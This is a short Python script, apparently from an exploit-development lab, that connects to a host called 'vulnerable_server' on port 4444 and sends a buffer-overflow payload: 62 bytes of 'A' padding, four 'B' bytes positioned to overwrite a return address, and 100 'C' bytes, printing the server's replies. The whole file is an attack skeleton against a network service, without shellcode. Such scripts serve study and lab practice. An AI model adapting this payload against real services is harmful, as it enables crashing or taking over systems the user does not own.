import socket
import time

server_name = "vulnerable_server" 
server_port = 4444        

payload = b"A" *62
payload += b"B" * 4
payload += b"C" * 100

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server_name, server_port))

response = s.recv(2048)
print(response.decode()) 

s.send(payload)

time.sleep(5)
response = s.recv(2048)
print(response.decode())

s.close()